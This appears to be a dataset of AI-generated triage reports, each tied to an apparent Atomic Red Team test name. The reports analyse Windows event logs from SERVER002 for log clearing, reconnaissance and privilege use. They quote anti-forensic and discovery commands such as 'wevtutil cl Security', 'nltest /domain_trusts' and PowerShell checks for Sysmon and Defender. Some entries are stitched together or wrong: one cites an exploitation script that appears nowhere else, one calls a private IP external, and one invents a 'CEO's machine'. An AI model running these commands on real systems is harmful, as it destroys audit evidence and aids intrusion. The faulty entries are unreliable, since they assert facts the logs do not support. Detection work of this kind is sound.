   - System Event Log entries with EventID 104 show that the log files for System, Windows PowerShell, and Microsoft-Windows-Sysmon/Operational were cleared by the user ""admin_test.""
   - Security Log entry with EventID 1102 indicates that the Security log was also cleared by the same user ""admin_test.""
   - Use of `wevtutil.exe` to clear these logs suggests an attempt to cover tracks or hide malicious activity, as log clearing is a common technique used by attackers post-compromise.

2. **PowerShell Activity:**
   - Sysmon log entries suggest the execution of PowerShell commands: `""powershell.exe"" & {Get-AdComputer -Filter *}` which is used for querying Active Directory for computer objects.
   - While this command could be part of legitimate administrative activity, in conjunction with the log clearing and context, it warrants scrutiny. PowerShell can be used for both benign and malicious purposes, depending on context and intent.

3. **Windows Defender and Windows Update Activities:**
   - The logs include updates for Windows Defender Antivirus (EventID 19) and Microsoft Defender AV (KB2267602) as part of regular system updates.
   - The process `wuauclt.exe` and related definitions updates are part of normal operations, indicating no immediate threat from these particular entries.

4. **Repeated Log-on Attempts with Error Code:**
   - Security log entries with EventID 5379 show repeated failed attempts to log-on using a MicrosoftAccount:user=02txoixylodcstop, which is unusual if this isn't a known user for SERVER002. These could signify attempts to brute-force or leverage compromised credentials.

5. **Process Activity:**
   - Various processes like `whoami.exe`, `hostname.exe`, and others running under the admin_test account depict standard command-line utilization, but their execution after log file clearing and PowerShell commanding raises concern about intent.

### Assessment and Resolution:

Based on the analysis of the logs:

- **Resolution: SUSPICIOUS**

The combination of log file clearing, PowerShell activity for AD querying without clear context, and repeated failed log-on attempts attributed to a potential external account raise red flags pointing towards anomalous behavior that could precede or follow a security incident.

### Recommendations:

1. **Further Investigation:**
   - Conduct a detailed investigation into the user ""admin_test"" activity, focusing on any correlations with deviations from standard operating procedures or roles.
   - Verify with administrators if the PowerShell command execution was sanctioned and track subsequent events or changes linked to it.

2. **Immediate Actions:**
   - Review and secure admin accounts, ensure multifactor authentication is in place, and audit permissions for accessing sensitive resources.
   - Monitor network logs and connections, focusing on any communication with external hosts, particularly those associated with admin_test's actions.

   - Strengthen auditing and alerting mechanisms for sensitive activities like log clearing.
   - Employ more comprehensive behavioral analytics tools to detect and mitigate similar activities in real-time.

In conclusion, while no definitive malicious action is identified, the activities and their pattern significantly suggest the potential for malicious intent or preparatory actions for compromise. Proceed with scrutiny and ensure preventive measures and investigative actions are prioritized."
Network Share Discovery command prompt,"Upon analyzing the provided Windows event logs for Server002, several indicators suggest suspicious behavior that warrants further investigation:

1. **Log Clearing Activity:**
   - Multiple events (Event ID 104 in System logs and Event ID 1102 in Security logs) indicate the clearing of event logs by the user `SERVER002\admin_test`. This behavior is suspicious as threat actors often clear logs to cover their tracks after unauthorized activities. 
   - The logs that have been cleared include the ""System,"" ""Windows PowerShell,"" and ""Security"" logs, which are critical for auditing and recognizing unauthorized actions.

2. **Time Change Events:**
   - There are multiple time change events (Event ID 4616 in Security logs and Event ID 1 in Kernel-General logs) showing the system time was adjusted. This can be suspicious if not correlated with legitimate administrative actions because tampering with time can aid in confusing chronological event tracking or in evading scheduled tasks or logging.

3. **Process Execution:**
   - Frequent executions of `wevtutil.exe` with the command line arguments to clear logs such as ""cl Application"" and ""cl Security"" indicate potential malicious intent. Wevtutil is a legitimate utility but when used to clear logs, it aligns with tactics used for anti-forensics.
   - A `cmd.exe` process with the command line `/c net view \\localhost` implies network reconnaissance activity, typically indicative of an attempt to gather information about the local network environment, which could be preparatory phase for lateral movement or further actions.

4. **Use of Administrative Privileges:**
   - The `admin_test` account shows a logon type of 3 (network logon) and possesses a range of significant privileges including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, etc., (Event ID 4672 in Security logs). Such privileges permit intensive system modifications and security overrides, presenting a high risk if misused.
   
5. **Service and Process Execution of Edge Update Components:**
   - Numerous executions related to Microsoft Edge update (`MicrosoftEdgeUpdate.exe` and its associated setup executables) under the `NT AUTHORITY\SYSTEM` user carry normal behavior if these are simply update schedules. However, if these processes were not meant to run during the timeframes mentioned or exhibit any anomalous command line or activity patterns, they need a closer examination.

### Assessment:
The logs suggest potential malicious activity with a particular focus on covering tracks through log clearance and possibly unauthorized reconnaissance. The fact that `SERVER002\admin_test` executed these actions, combined with the existence of admin-level privileges, heightens the risk profile of this behavior.

   - The command executed involves downloading and executing commands potentially aimed at exploiting or escalating privileges within the system, which is considered suspicious and potentially malicious.

3. **Schedule of Unusual Processes:**
   - There is also evidence of frequent execution of utilities like `wevtutil`, `whoami`, and `hostname` around the same timeframe as the log clearance, which could be part of reconnaissance activities or attempts to gather system information.

4. **Edge Update Logs:**
   - While the Microsoft Edge update entries appear to show typical update processes, they do not inherently indicate malicious intent within themselves. These entries are standard unless juxtaposed with other suspicious activities that suggest exploitation using trusted processes.

Given the combination of cleared logs and the execution of a known PowerShell script for exploitation, these findings suggest activities beyond what typically appears as normal user operations. The presence of a non-standard, potentially malicious script executed via PowerShell, combined with log clearance tactics, raises concerns about a potential compromise.

**Assessment:**
- **MALICIOUS**: The logs contain indicators of potential malicious activity, primarily due to the execution of a known exploitation script and logs clearance, suggesting an attempt to obfuscate unauthorized activity.

**Recommendations:**
- Conduct a thorough forensic analysis of the affected system to determine the full scope of the compromise.
- Verify if the PowerShell script execution and log clearance were authorized or linked to any legitimate penetration testing efforts.
- Check for any unauthorized access and changes within the environment.
- Implement stronger access controls and logging mechanisms to detect and prevent such activities in the future.
- Notify relevant stakeholders about the potential compromise and initiate incident response procedures to mitigate any potential impact."
Display group policy information via gpresult,"### Detailed Analysis of the Logs

**1. Log Clearing Events**
- **EventID 1102 in Security Log**: The security log was cleared by a user `admin_test` from `SERVER002`. Log clearing, particularly in the Security log, is a significant red flag. It suggests an attempt to cover tracks and is a common tactic after unauthorized or malicious activity.
- **EventID 104 in System Log**: The system log and Windows PowerShell logs were also cleared, again by the same user (`admin_test`). Similar to the Security log, clearing the System and PowerShell logs can indicate an attempt to hinder forensic investigation or traceability of potentially malicious activities.

**2. Process Execution and Command-Line Arguments**
- **Whoami.exe and Hostname.exe Operations**: These tools (whoami.exe and hostname.exe) were executed by `admin_test` with high integrity levels. While these are legitimate tools, they can sometimes be used by threat actors to enumerate system information or the current user context.
- **Use of wevtutil.exe**: This utility is employed to manage event logs. The command `wevtutil.exe cl` is used to clear logs, matching with the log clearing events mentioned above (evidence of malicious intent).
  
**3. Unusual Behavior in Services**
- **Time Anomaly (EventID 24 and 1 in System Log)**: Noticeable manipulation or discrepancies in system time settings (`svchost.exe` adjusting time), which can be a precursor or action as part of an advanced persistence threat (APT) or attack to align event log times with attacker activities or alter timestamps for deception.

**4. Microsoft Edge Update Processes**
- Numerous `MicrosoftEdgeUpdate.exe` processes are running, which appears related to software updating activities. However, excessive or unusual update processes, especially from temporary directories, could potentially hint at attempts to execute unauthorized executables or persistence mechanisms.

### Assessment

- The logs show strongly suspicious behavior. The clearing of event logs by `admin_test`—especially the Security and System logs—is a significant indicator of potential malicious intent. Using `wevtutil.exe` to manipulate logs reflects a clear evasion technique.
- Execution of system utility tools (`whoami.exe`, `hostname.exe`) may correlate to reconnaissance activities occurring on the system.
- While the Microsoft Edge Update activities could be benign as part of scheduled updates, the context of cleared logs, particularly following these update operations, raises suspicion.

### Resolution

**SUSPICIOUS -** The logs contain indicators that require further investigation. The log-clearing actions suggest an attempt to impede analysis and forensic capabilities, which needs deeper inspection into `admin_test` actions, verification of legitimate updates and processes, and audit of system integrity and possible breach points.

### Guidance on How to Proceed
1. **Immediate Response:**
   - Isolate the system (`Server002`) until a thorough investigation is complete.
2. **Investigate Logons and Logoff Times:**
   - Correlate `admin_test` activities with physical or remote access logs.
3. **Conduct File Integrity Checks:**
   - Verify system files, especially related to recently executed applications and services.
4. **Detailed Review of Command Usage:**
   - Scrutinize the command executions found in logs (`whoami`, `hostname`, `wevtutil`) for legitimacy and context.
5. **Audit Updates and Service Changes:**
   - Confirm the source and legitimacy of the Microsoft Edge Update activities.
6. **Further Analysis of Network Connections:**
   - Review for any unauthorized external communications that could signal data exfiltration or command and control channels.
7. **Consider Advanced Threat Detection Tools:**
   - Use sandboxing or advanced EDR solutions to inspect potential malware or suspect applications.
8. **Prepare for Potential Forensic Analysis:**
   - Consider disk imaging and memory analysis for persistent threats.
9. **Strengthen Monitoring and Alerting:**
   - Enhance detection for indicators like bulk log clearing events.

Given the potential severity, consider engaging external incident response expertise to ensure comprehensive handling and remediation of any security incident uncovered."
Query Registry,"### Detailed Analysis of the Logs:

Upon reviewing the Windows event logs, here are notable points of interest:

1. **Unusual Command-Line Activity:**
   - **Frequent Use of `wevtutil.exe`:** The `wevtutil.exe` process was repeatedly invoked to clear various event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). This behavior is suspicious because frequently clearing event logs can be an attempt to remove forensic evidence of potentially malicious activities.
   - **Extensive Registry Query Activity via `cmd.exe`:** A command line executed a series of registry queries using `reg.exe` to access various startup and service-related keys. This behavior suggests reconnaissance activities aiming to gather information about system startup configurations and possibly identify persistence mechanisms.
   
2. **Indicators of Potential Log Tampering:**
   - **Event Log Clearing Entries:** Multiple entries (Event ID 1102 in the Security log and Event ID 104 in the System log) indicate that the event logs were cleared. The user responsible for these actions is `admin_test` which aligns with the username executing the `wevtutil.exe` commands. Clearing event logs is often associated with attempts to cover tracks after malicious actions.

3. **High Integrity Level Operations:**
   - Many actions were performed at a ""High"" integrity level, which means they were executed with elevated privileges. This could indicate potential privilege escalation or the use of administrative permissions to perform unauthorized actions.

4. **Security Updates and Software Installations:**
   - Security intelligence updates for Microsoft Defender Antivirus and a version update for Microsoft Edge were observed. These updates appear to be legitimate activities, executed by `wuauclt.exe` and Microsoft Update processes at the system level.

5. **Failed Credential Access Attempts:**
   - Multiple Event ID 5379 entries indicate failed attempts to access target names associated with Microsoft accounts and Windows Live. The repeated failed attempts point towards potential unauthorized access attempts.

### Assessment and Conclusion:

- **Threat Assessment:**
  - The behavior exhibited, especially the sequence of registry enumeration and frequent log clearing by `admin_test`, is characteristic of malicious activities, including log cleansing to erase evidences and reconnaissance to understand system structure for possible exploitation.

- **Risk Level:**
  - **High Risk:** Due to the presence of log clearing events, extensive registry queries under potentially elevated privileges, and the suspicious pattern of behavior performered by the account `admin_test`.

### Resolution:
- **Classification: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the affected machine (Server002) from the network to prevent further potential compromise.
   - Change passwords for the affected user account (`admin_test`) and any other potentially affected accounts.
   - Consider disabling or removing any unnecessary administrative privileges temporarily.

2. **Further Investigation:**
   - Conduct a thorough forensic analysis on the machine to identify potential malware or unauthorized applications installed.
   - Review and audit other systems and accounts for similar behaviors.
   
3. **Remediation:**
   - Revert any unauthorized changes identified in the system configurations and registry settings.
   - Strengthen security measures such as enabling multi-factor authentication and enhancing logging and monitoring.
   - Provide security training to users to recognize and report suspicious activities.

4. **Reporting:**
   - Document findings and actions taken. This could involve notifying organizational security teams and potentially law enforcement or relevant authorities, depending on the scope and impact of the breach."
Environment variables discovery on windows,"After a thorough review of the Windows event logs provided, several entries suggest actions that may need additional scrutiny, particularly due to the potential of malicious incident:

1. **Log Clearing Activity**:
   - Multiple logs indicate the use of `wevtutil.exe` command line utility, which was executed by the user `SERVER002\admin_test`. This utility was specifically used to clear log channels like the System, Security, and Windows PowerShell logs. 
   - From the `System`, `Security`, and `Sysmon` logs, there are `LogFileCleared` events (Event ID 104) indicating that logs were cleared, which can be indicative of an attacker trying to cover tracks.

2. **Time Manipulation**:
   - There are entries with `EventID 4616` in the Security log showing that the system time was changed by the process `svchost.exe`. Time tampering is often used in attempts to evade detection mechanisms that rely on timestamps for log synchronization.

3. **Privilege Usage**:
   - Two Event ID 4672 entries indicate that the `admin_test` account was using high privilege tokens such as `SeDebugPrivilege`, `SeSecurityPrivilege`, among others. These privileges enable powerful access and potential control over the system, suggesting that the account had administrative privileges.

4. **Suspicious Process Activities**:
   - The Sysmon log highlights the execution of `cmd.exe` and other executable names that are standard but might have been used under unusual contexts. Processes like `whoami.exe` and `cmd.exe /c set` were executed. While not inherently malicious, in combination with the clearing of logs and the potential evasion of traces, it raises concern.

5. **Network and Logon Events**:
   - There were remote login sessions (`LogonType 3`) using NTLM (Event ID 4624), which appear normal but can also be associated with lateral movement in compromised systems when viewed in aggregation with the suspicious log clearing.

### Assessment:

Given the combination of cleared logs, potential log evasion, suspicious system time changes, and the use of high-level privileges by the `admin_test` account, the behavior observed in these logs is highly indicative of malicious activity potentially aimed at concealing unauthorized actions.

### Resolution: **MALICIOUS**

### Recommendations:
1. **Immediate Investigation**: Initiate a deeper forensic analysis on `SERVER002`, particularly focusing on lateral movement, data exfiltration, or persistence mechanisms.
2. **Containment**: Isolate `SERVER002` from the network to prevent further unauthorized access or data loss.
3. **Credential Audit**: Review and potentially reset credentials for the `admin_test` account and any accounts with elevated privileges.
4. **Monitoring and Alerts**: Implement and/or tighten logging and alerting for log clearing activities and process creation involving `cmd.exe`, `wevtutil.exe`, and unusual privilege escalation.
5. **Time Integrity Check**: Reinforce time integrity and synchronization settings to prevent unauthorized time changes.

Conclusively, these logs suggest an ongoing or attempted compromise scenario that must be addressed urgently to safeguard organizational assets and ensure network integrity."
Enumerate Root Domain linked policies Discovery,"Upon reviewing the provided Windows event logs, several indicators suggest potential malicious activity across the events:

1. **Event Log Clearing**:
   - The logs reveal multiple instances where the `wevtutil.exe` command was used to clear event logs. Specifically, the command-line entries indicate the clearing of different logs: Security, Application, and System. This behavior is often associated with an attempt to cover tracks after malicious activities.

   - **EventID 1102** in the Security logs and **EventID 104** in the System logs both reflect the clearing of these logs by the user `admin_test`. 

2. **Suspicious PowerShell Activity**:
   - The PowerShell events show execution with complex command-line arguments that extract Group Policy Objects (GPOs) from Active Directory using ADSI. This behavior could be indicative of reconnaissance activities within the network environment. The specific use of PowerShell for detailed directory queries and domain information extraction implies a deeper interest in network configuration, which is unusual for regular operational activities.

3. **High Integrity Level Execution**:
   - Processes such as `wevtutil.exe` and `PowerShell.exe` are run at a high integrity level, further suggesting administrative operations that might be used to execute or hide malicious activities.

4. **Svchost Time Modification Activity**:
   - Time modification logs with **EventID 4616** from `svchost.exe` suggest unauthorized synchronization or time setting alteration, possibly to align with cleaned logs or timestamp manipulation.

5. **Sysmon Logs**:
   - Sysmon logs corroborate these activities, recording process creations that correspond to both the PowerShell and `wevtutil.exe` executions, highlighting the various high-integrity operations.

**Assessment**:
- The logs demonstrate a classic pattern of cover-up post-intrusion tactics where an attacker or malicious insider tries to hide potentially malicious actions by clearing traces from the event logs. The PowerShell activity, combined with `wevtutil.exe` clearing logs without clear legitimate justification, strongly indicates potential malicious behavior.

**Resolution**: MALICIOUS

**Guidance**:
- Initiate a full incident response protocol to isolate the system and limit further potential damage.
- Review any additional potentially affected systems and logs for the same patterns.
- Reset credentials and enforce stricter access controls, as administrative credentials may have been compromised.
- Reconstruct valid system activity from backup logs where possible to determine the scope of malicious activities.
- Conduct a thorough forensic analysis of the affected system to identify other signs of tampering or data exfiltration."
Enumerate Linked Policies In ADSISearcher Discovery,"### Analysis:

#### Overview:
The provided logs from a Windows host indicate that there may have been unauthorized activities associated with both system and user-initiated processes. The most critical events include the clearing of logs and suspicious command-line usage, especially involving PowerShell scripts. These can be telltale signs of malicious actions attempting to cover tracks or execute unauthorized code.

#### Key Observations:

1. **Log Clearing**:
   - **Security Log - Event ID 1102**: The Security logs were cleared at `2024-10-23 21:29:49`. The user associated is ""admin_test,"" which is concerning as it may indicate log tampering to hide tracks of possible unauthorized activities.
   - **System Log - Event ID 104**: The System and PowerShell channels were cleared shortly after the incident. This reinforces the suspicion of log tampering.

2. **Time Manipulation**:
   - There are events associated with time changes (`Event ID 4616` & other Kernel-General events) indicating time reversions. Time manipulation is often used by attackers to evade detection and play backlogs of events ’out of sequence’.

3. **Suspicious PowerShell Activity**:
   - Multiple entries show suspicious PowerShell command executions. An extensive and obfuscated PowerShell script is noted, suggesting potential unauthorized access and activity. The command attempts to query Active Directory to possibly gather sensitive information.
   - **Windows PowerShell logs** correlate to these command-line executions indicating modification or query operations which are atypical for regular operations.

4. **Processes Executing Log Clearing Commands**:
   - Observed processes (`wevtutil.exe`) with command lines related to clearing various Windows event logs. This command is typically not used in daily operations and adds to the suspicion of malicious activity.

5. **Network Services**:
   - Observed legitimate services and processes related to Microsoft Edge updating components under `NT AUTHORITY\SYSTEM` which appear expected and regular, showing routine system update processes.

#### Assessment:
Based on the logs, there are multiple indications of potential unauthorized access and activities that appear malicious:

- **Log Clearing Actions**: Specifically indicates attempts to hide malicious actions.
  
- **PowerShell Script Execution**: Suggests possible data extraction or further exploitation attempts.

- **Time Manipulation Events**: Indicates something abnormal or intentional is being done to evade detection.

### Resolution:
- **MALICIOUS**: Various critical indicators like log clearing, suspicious PowerShell execution, and time manipulation point towards malicious activity with a very high certainty.

Remote System Discovery - nslookup,"### Detailed Analysis:

Upon reviewing the provided set of logs, I identified several key indicators of potential malicious activity:

1. **Event Log Cleared:** There are multiple instances (Event ID 104) where logs associated with the System, Windows PowerShell, and Security channels were cleared. This action is highly suspicious, as it is often used by attackers to cover their tracks or to ensure their actions are not easily detectable in the logs.

2. **Privileged User Actions:** Multiple logon events (Event ID 4624 and 4672) for the user `admin_test` show that this user has been granted several powerful privileges, including SeDebugPrivilege, SeBackupPrivilege, and SeTakeOwnershipPrivilege. The process also originated from an external IP address (192.168.0.102), which can be indicative of a lateral movement or compromise of the user's account.

3. **Suspicious PowerShell Activity:** The logs (Sysmon Event ID 1) show a series of PowerShell commands executed in a way that seems to be scanning the network by iterating over possible internal IP addresses and resolving them using nslookup. This type of behavior is often associated with reconnaissance activities, frequently seen as a part of a lateral movement or information-gathering phase of an attack.

4. **Use of `wevtutil` Utility:** Multiple executions of `wevtutil.exe` were recorded in the logs. This tool is commonly used to clear event logs, which corresponds with the cleared log events noted. The processes were executed under the `admin_test` user, matching the timing of the cleared event logs.

### Assessment:

Given the sequence of events, including the clearing of critical logs, execution of reconnaissance-like PowerShell commands, and appearance of external logon sessions with elevated privileges, the provided log entries strongly suggest that malicious activity is occurring on this host.

### Threats Identified:

- **Persistence and Evasion:** Clearing event logs and executing commands with elevated privileges hint at attempts to maintain persistence and evade detection.
- **Lateral Movement or Unauthorized Access:** The network scanning behavior suggests potential lateral movement or preparation for expanded access within the network environment.
- **Compromise of Credentials:** The use of privileged accounts and external access indicates possible compromise of user credentials.

### Guidance:

1. **Immediate Action:**
   - Perform an immediate account lockout for `admin_test` and conduct a full investigation to determine if credentials have been compromised.
   - Temporarily isolate the affected system (`Server002`) from the network to prevent further spread or data exfiltration.

2. **Investigative Steps:**
   - Analyze the source of the external logon and assess other systems for similar connections.
   - Review any changes made to the system configuration or installed software for unauthorized modifications.
   - Investigate network traffic logs for additional signs of lateral movement or data exfiltration.

3. **Post-Incident:**
   - Reinforce auditing and monitoring to ensure that user activity, especially with elevated privileges, is thoroughly logged and reviewed.
   - Educate staff on secure handling of credentials and the importance of reporting suspicious activities immediately.

### Final Resolution: MALICIOUS

These logs contain clear indicators of malicious activity, necessitating immediate defensive and investigative action to mitigate further risk."
Security Software Discovery,"Upon reviewing the provided Windows event logs, several patterns of suspicious activities arise that warrant further investigation:

1. **Event Logs Deletion:** 
   - Multiple instances of the `wevtutil.exe` utility being used to clear event logs, which is indicated by Event IDs 104 (LogFileCleared) and 1102 in the Security log. Specifically, logs have been cleared for the System, Security, and Windows PowerShell logs using the `wevtutil cl` command.
   - Log clearing is typically an action performed to cover tracks after malicious activity or during an unauthorized access attempt.

2. **Multiple Instances of System Monitoring:**
   - There are multiple PowerShell commands executed to gather information about running processes and services related to system monitoring, such as `Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }` and `Get-Service | where-object {$_.DisplayName -like '*sysm*'}`. These could be used by a threat actor to check for detection mechanisms.

3. **High Command Activity:**
   - The execution of many command-line utilities in rapid succession, such as `netsh`, `tasklist`, `findstr`, and `sc`, against system configurations and firewall settings, suggests a potentially malicious script designed to extract system and network details:
     - Commands like `netsh advfirewall`, `sc query windefend`, and various `tasklist` command lookups for processes related to security or antivirus software hint at reconnaissance or a preliminary step in a more extensive attack.

4. **Admin User Activity:**
   - Most of these activities, including log clearing and processes related to reconnaissance, are carried out by the user `SERVER002\\admin_test`, which implies that this user account might be compromised or is being used for these purposes without authorization.

Given these indicators, it appears that there is at least an attempt to obscure actions and conduct reconnaissance, pointing to the potential presence of malicious activity.

**Resolution: SUSPICIOUS**

### Recommendations:

- **Conduct a Thorough Investigation:**
  - Investigate the `admin_test` account to verify if it's been compromised or misused.
  - Review network logs and other systems for signs of lateral movement or data exfiltration.

- **Isolate the Affected Systems:**
  - To prevent potential spreading, isolate Server002 until a full forensic analysis is completed.

- **Enhance Logging and Monitoring:**
  - Ensure logging and monitoring solutions are functioning and capable of detecting repeated log clearance attempts or other evasive actions in the future.
  
- **Alert the Incident Response Team:**
  - Alert the IR team for immediate action and to conduct deeper analysis and containment activities."
System Time Discovery - PowerShell,"### Analysis of Logs

#### Suspicious or Anomalous Behavior

1. **Clearing Event Logs:**
   - Multiple instances of `wevtutil.exe` processes are observed within a short time frame, all executed by the user `SERVER002\admin_test`. These processes have command lines such as `""C:\Windows\system32\wevtutil.exe"" cl Application`, `""C:\Windows\system32\wevtutil.exe"" cl System`, and `""C:\Windows\system32\wevtutil.exe"" cl Security`. The use of `wevtutil.exe` to clear event logs (`cl` command) is suspicious, especially on critical logs such as Application, System, and Security. This action can be indicative of malicious activity intending to hide traces.

2. **Security Log Event 1102 - Log Cleared:**
   - An event with ID `1102` in the Security log indicates that the Security event logs were cleared. This is corroborated by processes with `ClientProcessId`s matching `wevtutil.exe` executions, confirming these actions were initiated by `admin_test`.

3. **Process Execution Analysis:**
   - There are multiple `conhost.exe` processes spawned by `wevtutil.exe`. While `conhost.exe` is a legitimate part of Windows, its frequent spawning after a suspicious process like `wevtutil.exe` might indicate scripting or automated actions, often associated with obfuscation or malicious scripting.

4. **Evasive Actions and Time Synchronization:**
   - The change of system time with events having `EventID 4616` might signify an attempt to manipulate timestamps which could be part of a strategy to obscure tracking of events by changing system time.

5. **Edge Update Activities:**
   - Numerous activities related to Microsoft Edge Update are expected in usual Windows behavior, and are executed under `NT AUTHORITY\SYSTEM`. However, the rapid succession and presence of multiple `MicrosoftEdgeUpdate.exe`-related processes should be monitored for unexpected installations or updates outside of scheduled times.

#### Assessment of Malicious Activity

Based on the analysis, the presence of `wevtutil.exe` processes clearing critical log files is a strong indicator of malicious intent. Such behavior is often associated with attempts to cover tracks after unauthorized actions. Other activities such as editing the system time and the specific use of `wevtutil.exe` to clear the Security logs align with common attacker tactics.

### Conclusion

- **Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Response:**
   - Isolate the affected system (`Server002`) from the network to prevent any spread of potential malicious activity.
   - Conduct a full system scan with an updated antivirus solution and other endpoint detection tools to inspect any lingering threats.

2. **Incident Response:**
   - Investigate the source and method of access used to initiate the malicious activities, particularly the credentials of `admin_test`.
   - Perform a detailed forensic investigation to uncover all actions and potential data alterations.

3. **Review and Remediation:**
   - Review access logs, credentials, and any network activities originating from `Server002`.
   - Change all passwords, especially those related to administrative accounts.
   - Enhance monitoring and logging configurations to detect similar future activities promptly, ensuring logs cannot be cleared without detection.

4. **Reporting and Documentation:**
   - Document the incident thoroughly for compliance and future reference.
   - Consider reporting the incident to any regulatory bodies if there is data compromise or a breach.

5. **Future Prevention:**

Windows Internal pktmon capture,"Upon analyzing the provided Windows event logs, several indicators suggest potential malicious activity:

1. **Multiple Event Log Clearances:**
   - We see multiple instances where event logs (System, Windows PowerShell, Security) were cleared, as evidenced by Event IDs 104 in the System log and 1102 in the Security log. This behavior is often associated with attempts to hide tracks post-compromise.

2. **Suspicious Command Line Executions:**
   - The presence of command executions using `wevtutil.exe` with the `cl` parameter, which is used to clear logs, is documented multiple times. For instance, commands such as `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational` appear in the Sysmon logs. These actions indicate deliberate log clearing intended to obfuscate malicious activities.

3. **Execution of pktmon:**
   - The execution of `pktmon.exe` is concerning. Although pktmon is a legitimate tool used for network monitoring in Windows, its execution through a script (`cmd.exe` with a chain of packet monitoring and log-related tools) can suggest attempts to capture or manipulate network traffic, potentially malicious if conducted without authorization.

4. **High-Privileged Operations:**
   - The logs reveal that processes executed under `admin_test` had elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), consistent with activities that require high privileges, such as log clearance.

5. **Unusual Parent-Child Process Relationships:**
   - The repeated pairing of `conhost.exe` with `wevtutil.exe` processes suggests attempts to clear logs. Normally these processes don’t run in such conjunction without a script or malicious activity.

6. **Presence of system utilities:**
   - Tools like `whoami.exe` and `hostname.exe` are invoked, potentially being used to gather system information—another sign indicative of post-compromise reconnaissance.

Given all these points, it highly suggests that there is unauthorized and potentially malicious activity occurring on the host in question, specifically involving actions to delete event logs and potentially examine or capture network traffic.

**Resolution: MALICIOUS**

**Recommendations:**
- Immediately isolate the system (Server002) from the network to prevent further potential lateral movement.
- Conduct a forensic image of the affected system for detailed offline analysis.
- Block and review logs related to `admin_test`'s account access and activities.
- Update and conduct in-depth scans with your EDR solution to identify and remove any detected threats.
- Reset credentials and review access privileges for `admin_test` and any other potentially compromised accounts.
- Conduct a review of security policies and log retention settings to ensure adequate monitoring capabilities are in place.
- Consider additional monitoring and alerting for log clearance actions and usage of administrative commands in Sysmon and Security logs."
Griffon Recon,"Based on the provided Windows event logs, several indicators suggest possible malicious activity or potential compromise on the system ""Server002"". Here's a detailed analysis:

### Suspicious and Anomalous Behaviors:

1. **Event Logs Cleared**:
   - The security log contains Event ID 1102 showing that the event logs were cleared by the user `admin_test` on ""Server002"": `""ClientProcessId"":""4848""`, `""EventRecordID"":""30354""`. 
   - Additional referencing shows that both system and security logs were cleared almost simultaneously. This is usually an indicator of someone trying to cover their tracks after conducting unauthorized or malicious activities.

2. **Suspicious PowerShell Activity**:
   - The PowerShell logs show Event ID 600 with the HostApplication running `powershell.exe` and executing a script: `cscript ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1082\\src\\griffon_recon.vbs""`.
   - Atomic Red Team is a known set of adversary emulation scripts used for testing security systems, but their unauthorized use on critical infrastructure, especially on a CEO's machine, is suspicious.

3. **Wevtutil.exe Processes**:
   - Several entries in the Sysmon logs indicate the use of `wevtutil.exe` to clear logs (CommandLine: `wevtutil cl Security/System`) started by the `admin_test` user.
   - Wevtutil is a command-line utility for managing event logs and clearing them without a known benign explanation, which supports the hypothesis of log tampering.

4. **Unauthorized Scripts and Potential Reconnaissance**:
   - Execution of `griffon_recon.vbs` from Windows PowerShell, following the use of cscript.exe, indicates potential reconnaissance activities using a script that gathers information about the system.
   - The presence of scripts in temporary directories and the use of PowerShell to execute them often aligns with attacker behavior, especially if found on an executive's machine without explicit authorization during routine audits or penetration tests.

5. **Other System Activities**:
   - Several EdgeUpdate and associated processes running with System privileges, although common in enterprise environments, should be verified for scheduled maintenance or unexpected update configurations, but may not necessarily imply compromise.

### Assessment of the Situation:

Given the clearing of logs, unauthorized script execution, and suspicious invoking of utilities typically used for evasive actions, there is a strong likelihood that these events are part of unauthorized or potentially malicious activities.

### Conclusion:

- **Resolution**: **MALICIOUS**
  - The evidence of log clearing, suspicious PowerShell script execution indicative of reconnaissance, coupled with techniques used to cover tracks, strongly suggests malicious intent or compromise.
  
### Guidance and Next Steps:

1. **Immediate Containment**:
   - Isolate ""Server002"" to prevent further malicious activities and data exfiltration.

2. **Deep Analysis and Investigation**:
   - Conduct a full forensic investigation to determine how the unauthorized access occurred.
   - Analyze the scripts and processes that were executed for specific capabilities or data gathering actions.

3. **Reinforce Security**:
   - Review and enhance logging policies to prevent unauthorized log clearing.
   - Implement stricter administrative access controls and regular audit trails.
   - Check for similar activities across other critical systems within the network."
Windows - Discover domain trusts with nltest,"Upon reviewing the provided Windows event logs, several activities stand out as suspicious and potentially indicative of malicious behavior:

1. **Command Line Activity:**
   - The execution of `cmd.exe` with the command line `""cmd.exe"" /c nltest /domain_trusts & nltest /trusted_domains` under the user `admin_test` is noteworthy. These commands are typically used for querying and identifying trust relationships in a domain, which could suggest reconnaissance activity by an attacker.

2. **Use of `wevtutil.exe`:**
   - There are multiple instances of `wevtutil.exe` being executed with commands to clear various logs (e.g., `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Windows PowerShell`). This is a common tactic used by attackers to erase their tracks and make forensic analysis more challenging.

3. **Event Log Clearing:**
   - The security logs show EventID `1102`, which indicates that the Windows Security logs were cleared. The system logs also have EventID `104`, indicating that the system and PowerShell logs were cleared. Such actions are suspicious as they are typically executed to hide malicious activities.

4. **Integrity and Other Indicators:**
   - The processes are running with a high integrity level, indicating they may have the potential to make system-level changes.
   - The `where.exe` command to locate `nltest.exe` prior to its execution could be part of the reconnaissance process to ensure the tool is available.

5. **Process Tree:**
   - The execution pattern spanning from `cmd.exe` to `nltest.exe` and the coupled use of `wevtutil` suggests a deliberate attempt to gather information and possibly hide activities by clearing logs.

Given the combination of reconnaissance commands, log clearing activities, and execution under a high-integrity context, these behaviors align with tactics commonly observed in cyber attacks, particularly those involving lateral movement and covering tracks.

### Resolution
**MALICIOUS -** The logs contain clear indicators of malicious activity, including reconnaissance and log tampering, which justify this resolution. 

### Guidance
- Immediate containment measures should be taken to isolate the affected machine (Server002) to prevent further lateral movement or exfiltration of data.
- Conduct a full forensic analysis of the system to identify potential data breaches or further compromise.
- Review access and audit logs of other critical systems to which this server has connections.
- Change passwords for all accounts that were logged in during this period, particularly for `admin_test`.

Permission Groups Discovery PowerShell (Local),"Upon reviewing the provided event logs, several activities stand out as potentially suspicious or indicative of a compromise. Here’s the detailed analysis:

### Suspicious Activities
